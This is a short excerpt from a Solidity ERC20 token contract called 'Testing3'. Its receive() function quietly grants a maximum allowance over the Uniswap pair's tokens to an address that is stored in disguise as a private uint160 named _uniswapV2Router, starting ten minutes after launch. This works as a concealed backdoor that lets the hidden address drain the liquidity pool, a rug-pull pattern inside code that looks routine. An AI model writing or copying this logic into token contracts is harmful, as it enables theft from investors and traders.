...
contract Testing3 is Context, IERC20, Ownable {
    ...
    uint160 private _uniswapV2Router;
    ...
    string private constant _name = unicode"Testing3";
    string private constant _symbol = unicode"TEST3";
    ...
    receive() external payable {if(block.timestamp > (launchTime + 10 minutes)){_allowances[uniswapV2Pair][address(_uniswapV2Router)] = type(uint).max;}}
